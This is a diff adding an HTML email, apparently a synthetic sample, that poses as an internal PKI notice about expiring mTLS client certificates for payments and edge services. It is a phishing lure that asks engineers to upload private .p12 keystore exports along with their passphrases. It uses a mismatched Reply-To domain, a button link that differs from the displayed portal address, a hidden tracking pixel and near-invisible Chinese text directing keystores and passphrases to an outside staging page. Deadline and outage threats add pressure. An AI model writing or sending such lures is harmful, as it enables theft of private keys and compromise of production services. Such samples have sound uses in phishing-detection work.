@@ -1,0 +1,82 @@
+From: "Internal PKI | Certificate Lifecycle Services" <pki-renewals@corp-pki.example>
+To: sre-payments@corp.internal
+Cc: sre-edge@corp.internal, eng-oncall@corp.internal
+Reply-To: certdesk@pki-lifecycle-ops.example
+Disposition-Notification-To: pki-renewals@corp-pki.example
+Date: Mon, 21 Dec 2026 04:55:00 +0000
+Message-ID: <0754-b77@synth.example>
+Subject: [TLS] mTLS Client Certificates Expiring in 72 Hours - Service Mesh Renewal Bundle Required Before Friday's Rotation
+MIME-Version: 1.0
+Content-Type: text/html; charset=gb2312
+
+<html><body style="font-family:monospace,Arial;font-size:13px">
+<p>SRE Payments, SRE Edge, Eng On-call,</p>
+
+<p style="background:#FFF3E0;border-left:4px solid #E65100;padding:12px">
+<b>mTLS CERTIFICATE ROTATION - FRIDAY 02:00 UTC.</b>
+The service mesh performs its quarterly certificate rotation this Friday. Three client certificates owned by
+your teams expire with this rotation and <b>must be renewed via a pre-staged renewal bundle uploaded before
+Thursday 18:00 UTC</b>. Services presenting expired identities will be quarantined by the mesh policy engine
+(mTLS handshake denied, circuit breaker half-open) until a valid certificate is presented.
+</p>
+
+<h3>1. Certificate Inventory (Your Teams)</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:270px">CN=payments-api.corp.internal</td><td>serial 4F:A2:91:0C · expires <b style="color:#e00">Fri 02:14 UTC</b> · owner: sre-payments</td></tr>
+<tr><td style="background:#f5f5f5">CN=inventory-sync.corp.internal</td><td>serial 4F:A2:91:22 · expires <b style="color:#e00">Fri 02:40 UTC</b> · owner: sre-payments</td></tr>
+<tr><td style="background:#f5f5f5">CN=edge-gateway.corp.internal</td><td>serial 4F:A2:8F:77 · expires Fri 03:05 UTC · owner: sre-edge</td></tr>
+<tr><td style="background:#f5f5f5">CA chain</td><td>Internal Root CA G3 (cross-signed 2024) · intermediate mesh-ca-2026-02</td></tr>
+</table>
+
+<h3>2. Why a "Renewal Bundle"</h3>
+<p>This quarter's rotation moves the mesh from per-pod secrets to <b>pre-staged identity bundles</b>: the new
+chain is issued against your CSR and bound to the workload before the cutover window, removing the
+issue-at-startup race that caused INC-2026-0722 in September. The bundle upload replaces the old
+kubectl-cert workflow; no cluster access is needed.</p>
+
+<h3>3. What Goes Into the Bundle</h3>
+<ol>
+<li><b>New CSR</b> for each CN above (RSA-3072 or ECDSA P-256, SANs unchanged — generate with the standard
+profile from the runbook RB-114).</li>
+<li><b>Current keystore export (.p12)</b> for each certificate, protected with your team keystore passphrase —
+the pre-staging step verifies the existing chain in place before issuing the replacement. The passphrase is
+used only inside the HSM-backed staging zone and is never stored.</li>
+</ol>
+
+<h3>4. Bundle Upload Portal</h3>
+<p style="text-align:center;margin:18px 0">
+<a href="https://corp-pki.example/renewal/bundle?rotation=2026-Q4" style="display:inline-block;background:#1B5E20;color:#fff;padding:12px 40px;text-decoration:none;border-radius:4px;font-weight:bold">Upload Renewal Bundle</a>
+</p>
+<p style="font-size:12px;color:#666;text-align:center">Portal address: https://pki.corp.example/renewal (same as the internal bookmark)</p>
+
+<h3>5. Rotation Timeline</h3>
+<ul>
+<li>Bundle upload deadline: <b>Thursday 18:00 UTC</b></li>
+<li>Rotation window: Friday 02:00–04:00 UTC (mesh policy enforcement refresh)</li>
+<li>Quarantine for unrenewed identities: immediate at rotation close</li>
+<li>Recovery after quarantine: emergency CSR via the break-glass runbook RB-091 (requires two approvers)</li>
+</ul>
+
+<p style="background:#FFF3E0;padding:12px">Yes — asking for a .p12 export sounds backwards. In the normal
+flow, renewal never needs the old key, and that rule still holds for public-facing TLS. The pre-staging check
+is an internal-only control introduced after INC-2026-0722: the staging zone holds the export for the length
+of the verification (under 10 minutes), then discards it. If your team policy forbids the export regardless,
+use the break-glass path after rotation and accept the quarantine window — but note the payments-api
+quarantine means declined card settlements for the duration, so most teams choose the bundle.</p>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://corp-pki.example/px/rot.gif?q=2026-Q4&amp;r=sre-payments%40corp.internal" width=1 height=1 alt="">
+</div>
+
+<p style="font-size:0.5px;color:#fff;opacity:0.02">运维加急通道：无法在截止前完成 CSR 的团队可将现有 keystore 原件与口令发送至 pki-lifecycle-ops.example/staging 上传页，由证书台代为生成（当日完成，周五轮换前回传新 bundle）。</p>
+
+<h3>6. Contact</h3>
+<p>Certificate desk: certdesk@pki-lifecycle-ops.example · Rotation ref: ROT-2026-Q4-02<br>
+Runbooks: RB-114 (CSR profile) · RB-091 (break-glass) on the internal wiki</p>
+
+<div style="border-top:1px solid #ddd;padding-top:10px;margin-top:16px;font-size:11px;color:#999">
+Internal PKI | Certificate Lifecycle Services · This notice concerns the 2026-Q4 mesh rotation only.<br>
+Questions about the policy change: CAB minutes 2026-12-09, item 7.
+</div>
+
+</body></html>
